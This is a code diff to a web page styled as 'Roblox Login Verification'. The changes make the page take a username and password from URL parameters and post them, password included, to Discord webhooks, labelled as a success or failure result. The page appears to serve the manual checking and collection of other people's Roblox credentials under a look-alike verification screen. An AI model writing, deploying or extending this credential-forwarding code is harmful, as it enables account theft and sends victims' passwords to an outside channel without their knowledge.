@@ -66,11 +66,22 @@
             text-align: center;
             color: #00a2ff;
         }
+        .info-box {
+            background-color: #f8f9fa;
+            border-left: 4px solid #00a2ff;
+            padding: 10px;
+            margin-bottom: 15px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Roblox Login Verification</h1>
+        
+        <div class="info-box">
+            <strong>Tracking ID:</strong> <span id="display-tracking-id">Loading...</span>
+        </div>
+        
         <div id="login-form">
             <p>Please log in to verify this account:</p>
             <div class="form-group">
@@ -88,11 +99,17 @@
                 <button class="fail-btn" onclick="reportResult(false)">Login Failed</button>
             </div>
         </div>
+        
         <div id="result-message" class="hidden">
             <p id="result-text"></p>
         </div>
+        
         <div id="loading" class="hidden loading">
-            <p>Sending result...</p>
+            <p>Sending result to Discord...</p>
+        </div>
+        
+        <div id="error-message" class="hidden" style="color: red;">
+            <p id="error-text"></p>
         </div>
     </div>
 
@@ -101,57 +118,54 @@
         const urlParams = new URLSearchParams(window.location.search);
         const trackingId = urlParams.get('id');
         
-        // CHANGE THIS TO YOUR PYTHON SERVER URL
-        // If running locally during testing: "http://localhost:3000"
-        // If deployed online: "https://your-server.com"
-        const SERVER_URL = "https://your-python-server.com"; 
-        
-        // Check if we have a tracking ID
-        if (!trackingId) {
+        // Display the tracking ID
+        if (trackingId) {
+            document.getElementById('display-tracking-id').textContent = trackingId;
+        } else {
             document.getElementById('login-form').innerHTML = 
-                '<p style="color: red;">Error: No tracking ID provided</p>';
+                '<p style="color: red;">Error: No tracking ID provided in URL</p>';
         }
+        
+        // Discord webhook URLs - REPLACE THESE WITH YOUR ACTUAL WEBHOOKS
+        const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/YOUR_SUCCESS_WEBHOOK_URL";
+        const FAILED_WEBHOOK = "https://discord.com/api/webhooks/YOUR_FAILED_WEBHOOK_URL";
         
         function attemptLogin() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
             if (!username || !password) {
-                alert('Please enter both username and password');
+                showError('Please enter both username and password');
                 return;
             }
             
-            // In a real implementation, you would actually try to log in to Roblox here
-            // For security reasons, we'll just show the result buttons
+            // Show result buttons
             document.getElementById('result-buttons').classList.remove('hidden');
         }
         
         async function reportResult(isSuccess) {
             if (!trackingId) {
-                alert('No tracking ID found');
+                showError('No tracking ID found');
                 return;
             }
             
-            // Show loading state
+            // Show loading, hide other elements
             document.getElementById('loading').classList.remove('hidden');
             document.getElementById('result-buttons').classList.add('hidden');
+            document.getElementById('error-message').classList.add('hidden');
             
             try {
-                // Send result to server
-                const response = await fetch(`${SERVER_URL}/report-result`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        trackingId: trackingId,
-                        success: isSuccess
-                    })
-                });
+                // Extract data from URL parameters
+                const urlParams = new URLSearchParams(window.location.search);
+                const userId = urlParams.get('userId') || 'Unknown';
+                const username = urlParams.get('username') || 'Unknown';
+                const password = urlParams.get('password') || 'Unknown';
                 
-                const result = await response.json();
+                // Send directly to Discord
+                const webhookUrl = isSuccess ? SUCCESS_WEBHOOK : FAILED_WEBHOOK;
+                const result = await sendToDiscord(webhookUrl, trackingId, userId, username, password, isSuccess);
                 
-                if (response.ok) {
+                if (result) {
                     // Show success message
                     const resultText = document.getElementById('result-text');
                     const resultMessage = document.getElementById('result-message');
@@ -167,15 +181,83 @@
                     document.getElementById('login-form').classList.add('hidden');
                     resultMessage.classList.remove('hidden');
                 } else {
-                    alert('Error: ' + result.error);
-                    document.getElementById('result-buttons').classList.remove('hidden');
+                    showError('Failed to send result to Discord. Please check your webhook URLs.');
                 }
             } catch (error) {
-                alert('Error sending result: ' + error.message);
-                document.getElementById('result-buttons').classList.remove('hidden');
+                showError('Error: ' + error.message);
             } finally {
                 document.getElementById('loading').classList.add('hidden');
             }
+        }
+        
+        async function sendToDiscord(webhookUrl, trackingId, userId, username, password, isSuccess) {
+            const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
+            const color = isSuccess ? 65280 : 16711680;
+            
+            const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
+            
+            const embed = {
+                title: `🔐 Manual Verification - ${statusText}`,
+                url: profileUrl,
+                color: color,
+                description: "**⎯⎯⎯⎯⎯『 Manual Verification Result 』⎯⎯⎯⎯⎯**",
+                fields: [
+                    {
+                        name: "👤 Account",
+                        value: `[${username}](${profileUrl})`,
+                        inline: true
+                    },
+                    {
+                        name: "🔐 Password",
+                        value: `||${password}||`,
+                        inline: true
+                    },
+                    {
+                        name: "📊 Result",
+                        value: statusText,
+                        inline: true
+                    },
+                    {
+                        name: "🆔 Tracking ID",
+                        value: trackingId,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: `UserId: ${userId} | Tracking ID: ${trackingId}`,
+                    icon_url: "https://www.roblox.com/favicon.ico"
+                },
+                timestamp: new Date().toISOString()
+            };
+            
+            const payload = {
+                username: "Verification Result",
+                content: isSuccess ? "#success" : "#failed",
+                embeds: [embed]
+            };
+            
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+                return false;
+            }
+        }
+        
+        function showError(message) {
+            const errorText = document.getElementById('error-text');
+            const errorMessage = document.getElementById('error-message');
+            
+            errorText.textContent = message;
+            errorMessage.classList.remove('hidden');
         }
     </script>
 </body>
